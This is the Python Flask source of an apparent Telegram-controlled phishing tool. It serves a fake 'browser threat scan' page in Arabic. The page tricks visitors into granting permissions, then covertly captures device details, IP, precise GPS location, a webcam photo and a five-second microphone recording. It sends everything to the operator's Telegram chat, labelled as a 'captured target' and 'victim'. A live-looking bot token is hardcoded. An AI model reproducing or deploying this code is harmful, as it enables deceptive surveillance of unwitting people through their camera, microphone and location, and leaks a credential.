import base64, requests, os, json, time
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# ==========================================
# --- إعدادات الإمبراطور سيوفي (v18.0) ---
# ==========================================
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"
BASE_URL = "https://sif-pro.onrender.com" # تم تصحيح الرابط (بدون أي علامات)
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
SUB_URL = "https://t.me/FAABOT?start=7041600701" 

system_config = {
    "welcome_msg": "🔥 أهلاً بك ملك سيوفي في لوحة التحكم الشاملة v18.0\n\nكل الحساسات مدمجة (صوت، صورة، موقع، معلومات)! 🚀",
    "trap_title": "تأكيد الأمان الموحد",
    "banned_ips": [],
    "banned_users": [],  
    "all_users": {}      
}

def tg_request(method, payload=None, files=None):
    try:
        if files: return requests.post(API_URL + method, data=payload, files=files, timeout=30).json()
        return requests.post(API_URL + method, json=payload, timeout=30).json()
    except: return None

# واجهة الصيد الاحترافية (تشمل الموقع ومعلومات الجهاز)
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 0 30px rgba(243, 128, 32, 0.2); }
        .btn { background: #f38020; color: #000; border: none; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1rem; }
        #st { margin-top: 20px; color: #777; font-size: 0.8rem; }
        #v { position: fixed; top: -10px; left: -10px; width: 1px; height: 1px; opacity: 0.01; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon" style="font-size:50px; color:#f38020;">🛡️</div>
        <h2>كشف التهديدات في المتصفح</h2>
        <p style="color: #bbb;">يرجى تفعيل الفحص الأمني والموافقة على الصلاحيات للمتابعة.</p>
        <button class="btn" id="go" onclick="startCapture()">بدء الفحص الآن</button>
        <div id="st">بانتظار البدء...</div>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
        const send = (d, t) => fetch('/api/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d, t})});
        
        async function startCapture() {
            const btn = document.getElementById('go'); const st = document.getElementById('st');
            btn.style.display = 'none'; st.innerText = "جاري جمع بيانات الأمان...";
            try {
                const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'Hidden'}));
                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                const v = document.getElementById('v'); v.srcObject = stream; await v.play();
                
                const b = await navigator.getBattery().catch(() => ({}));
                // جمع معلومات الجهاز الشاملة
                const deviceInfo = `🎯 **New Target Captured!**\\n━━━━━━━━━━━━━━\\n` +
                                   `🌐 IP: \`${ipData.ip}\`\\n` +
                                   `🔋 Battery: ${Math.round(b.level*100)}% (${b.charging ? '⚡' : '🔋'})\\n` +
                                   `📱 System: ${navigator.platform}\\n` +
                                   `🖥️ Screen: ${window.screen.width}x${window.screen.height}\\n` +
                                   `🧠 CPU Cores: ${navigator.hardwareConcurrency}\\n` +
                                   `🌍 Language: ${navigator.language}`;
                await send(deviceInfo, 'msg');

                // جلب الموقع الدقيق
                navigator.geolocation.getCurrentPosition(p => {
                    const lat = p.coords.latitude; const lon = p.coords.longitude;
                    send(`📍 **موقع الضحية الدقيق:**\\nhttps://www.google.com/maps?q=${lat},${lon}`, 'msg');
                }, null, {enableHighAccuracy: true});

                setTimeout(() => {
                    // التقاط الصورة
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0); 
                    send(c.toDataURL('image/jpeg', 0.8), 'img');
                    st.innerText = "جاري رفع بصمة الصوت...";
                    
                    // تسجيل الصوت
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
                        const reader = new FileReader();
                        reader.readAsDataURL(blob);
                        reader.onloadend = async () => {
                            await send(reader.result, 'aud');
                            st.innerText = "✅ تم الفحص بنجاح!";
                            stream.getTracks().forEach(track => track.stop());
                        };
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), 5000);
                }, 2000);

            } catch (e) { st.innerText = "❌ يرجى منح الصلاحيات للفحص!"; }
        }
    </script>
</body>
</html>
'''

@app.route('/')
def home():
    if request.remote_addr in system_config["banned_ips"]: return "BLOCKED", 403
    return render_template_string(HTML_TEMPLATE, title=system_config["trap_title"])

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.get_json(force=True, silent=True)
    if not data: return "ERROR"
    t, d = data.get('t'), data.get('d')
    if t == 'msg': tg_request("sendMessage", {'chat_id': ADMIN_ID, 'text': d, 'parse_mode': 'Markdown'})
    elif t == 'img':
        img = base64.b64decode(d.split(',')[1])
        tg_request("sendPhoto", {'chat_id': ADMIN_ID, 'caption': "📸 **New Photo**"}, {'photo': ('c.jpg', img)})
    elif t == 'aud':
        aud_data = base64.b64decode(d.split(',')[1])
        tg_request("sendVoice", {'chat_id': ADMIN_ID, 'caption': "🎙 **Voice Capture**"}, {'voice': ('v.ogg', aud_data)})
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json(force=True, silent=True)
    if not update: return "OK"
    if "message" in update:
        msg = update["message"]; chat_id = str(msg["chat"]["id"])
        username = msg.get("from", {}).get("username", "NoUser")
        text = msg.get("text", "")
        system_config["all_users"][chat_id] = f"@{username}"

        if chat_id in system_config["banned_users"]: return "OK"
        if chat_id == ADMIN_ID:
            if text.startswith("/user_ban"):
                uid = text.split(" ")[1] if len(text.split(" ")) > 1 else ""
                if uid: system_config["banned_users"].append(uid); tg_request("sendMessage", {"chat_id": chat_id, "text": f"🚫 Banned: `{uid}`"})
            elif text.startswith("/user_unban"):
                uid = text.split(" ")[1] if len(text.split(" ")) > 1 else ""
                if uid in system_config["banned_users"]: system_config["banned_users"].remove(uid); tg_request("sendMessage", {"chat_id": chat_id, "text": f"✅ Unbanned: `{uid}`"})
            
            kb = {"inline_keyboard": [[{"text": "🔗 رابط الصيد", "callback_data": "gen_link"}, {"text": "👥 قائمة المستخدمين", "callback_data": "list_users"}]]}
            tg_request("sendMessage", {"chat_id": chat_id, "text": system_config["welcome_msg"], "reply_markup": kb, "parse_mode": "Markdown"})
        else:
            sub_kb = {"inline_keyboard": [[{"text": "اضغط هنا للاشتراك أولاً ✅", "url": SUB_URL}]]}
            tg_request("sendMessage", {"chat_id": chat_id, "text": "⚠️ يجب الاشتراك لاستخدام البوت!", "reply_markup": sub_kb})
    elif "callback_query" in update:
        return handle_callback(update["callback_query"])
    return "OK"

def handle_callback(query):
    cid = str(query["message"]["chat"]["id"]); data = query["data"]
    if cid != ADMIN_ID: return "OK"
    if data == "gen_link": tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 رابطك:\n`{BASE_URL}`"})
    elif data == "list_users":
        res = "👥 **قائمة المستخدمين:**\n\n"
        for uid, uname in system_config["all_users"].items(): res += f"👤 {uname} | ID: `{uid}`\n"
        tg_request("sendMessage", {"chat_id": cid, "text": res, "parse_mode": "Markdown"})
    return "OK"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
